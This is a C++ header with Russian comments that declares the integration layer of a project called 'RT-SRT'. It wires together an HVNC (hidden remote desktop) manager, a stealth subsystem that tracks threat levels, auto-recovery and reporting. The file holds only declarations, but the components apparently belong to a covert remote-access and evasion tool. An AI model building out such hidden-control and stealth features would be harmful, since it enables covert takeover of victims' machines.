#pragma once

// Интеграционный заголовок для связи всех компонентов RT-SRT

#include "hvnc/hvnc_manager.h"
#include "stealth/stealth_system.h"
#include "logger/file_logger.h"

// Инициализация всех подсистем
namespace RTSRTIntegration {
    
    // Глобальная инициализация
    bool InitializeAllSystems();
    void ShutdownAllSystems();
    
    // HVNC интеграция
    bool StartHVNCSystem(const std::string& browserPath = "");
    bool StopHVNCSystem();
    bool IsHVNCActive();
    HVNCStatus GetHVNCStatus();
    
    // Stealth интеграция  
    bool StartStealthSystem();
    bool StopStealthSystem();
    bool IsStealthActive();
    SecurityThreatLevel GetCurrentThreatLevel();
    
    // Обработчики событий
    void OnThreatDetected(const ThreatInfo& threat);
    void OnHVNCError(HVNCError error);
    void OnSystemStateChange();
    
    // Мониторинг здоровья системы
    struct SystemHealth {
        bool hvncHealthy;
        bool stealthHealthy;
        bool resourcesHealthy;
        SecurityThreatLevel threatLevel;
        HVNCStatus hvncStatus;
        DWORD totalHandles;
        SIZE_T totalMemoryMB;
        std::string lastError;
    };
    
    SystemHealth GetSystemHealth();
    bool IsSystemHealthy();
    void LogSystemStatus();
    
    // Автоматическое восстановление
    bool EnableAutoRecovery();
    bool DisableAutoRecovery();
    bool TriggerSystemRecovery();
    
    // Отчёты
    std::string GenerateSystemReport();
    std::string GeneratePerformanceReport();
    void ExportDiagnosticData(const std::string& filepath);
}

// Макросы для быстрого доступа
#define RTSRT_INIT() RTSRTIntegration::InitializeAllSystems()
#define RTSRT_SHUTDOWN() RTSRTIntegration::ShutdownAllSystems()
#define RTSRT_START_HVNC(browser) RTSRTIntegration::StartHVNCSystem(browser)
#define RTSRT_STOP_HVNC() RTSRTIntegration::StopHVNCSystem()
#define RTSRT_START_STEALTH() RTSRTIntegration::StartStealthSystem()
#define RTSRT_STOP_STEALTH() RTSRTIntegration::StopStealthSystem()
#define RTSRT_HEALTH_CHECK() RTSRTIntegration::IsSystemHealthy()

// Callback типы для расширенной интеграции
typedef void (*ThreatCallback)(const ThreatInfo& threat);
typedef void (*HVNCErrorCallback)(HVNCError error);
typedef void (*SystemStateCallback)();